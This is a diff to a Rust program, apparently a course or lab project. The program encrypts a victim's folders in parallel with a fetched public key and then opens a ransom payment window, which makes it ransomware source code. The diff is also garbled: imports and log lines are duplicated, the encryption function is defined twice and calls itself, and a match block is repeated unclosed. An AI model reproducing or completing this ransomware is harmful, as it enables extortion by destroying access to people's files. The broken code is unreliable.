@@ -1,5 +1,7 @@
 use std::fs;
 use std::io::{self, Write};
+use std::fs;
+use std::io::{self, Write};
 use std::path::PathBuf;
 
 use anyhow::Result;
@@ -9,7 +11,10 @@ use c_monster_co_2ic80::cryptography::chunk::DEBUG_ENABLED;
 use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
 use c_monster_co_2ic80::debug_log;
 use c_monster_co_2ic80::networking::client::gen_key;
+use c_monster_co_2ic80::gui::payment::show_payment_window;
+use c_monster_co_2ic80::gui::warning::show_warning_window;
 
+use sodiumoxide::crypto::box_::PublicKey;
 use sodiumoxide::crypto::box_::PublicKey;
 
 use windows::{
@@ -47,6 +52,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
+    let result = run_encryption().await;
+
+    if DEBUG_ENABLED {
+        println!("\nPress Enter to exit...");
+        io::stdout().flush()?;
+        let mut input = String::new();
+        io::stdin().read_line(&mut input)?;
+    }
+
+    result
+}
+
+async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
     let pk: PublicKey = gen_key().await?;
 
     let paths = [
@@ -65,7 +83,12 @@ async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
             let path_str = path_ptr.to_string().unwrap();
             let path_buf: PathBuf = path_str.into();
             debug_log!("path: {:?}", path_buf);
+            debug_log!("path: {:?}", path_buf);
 
+            // match encrypt_folder(&path_buf, &pk) {
+            match encrypt_folder_parallel(&path_buf, &pk, None).await {
+                Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path),
+                Err(e) => debug_log!("✗ Error encrypting {:?}: {}", path, e),
             // match encrypt_folder(&path_buf, &pk) {
             match encrypt_folder_parallel(&path_buf, &pk, None).await {
                 Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path),
@@ -76,6 +99,10 @@ async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
             fs::write(out_path, &pk)?;
         }
     }
+
+    // Show payment window after encryption
+    println!("Encryption complete! Opening payment window...");
+    show_payment_window(Some(pk));
 
     Ok(())
 }
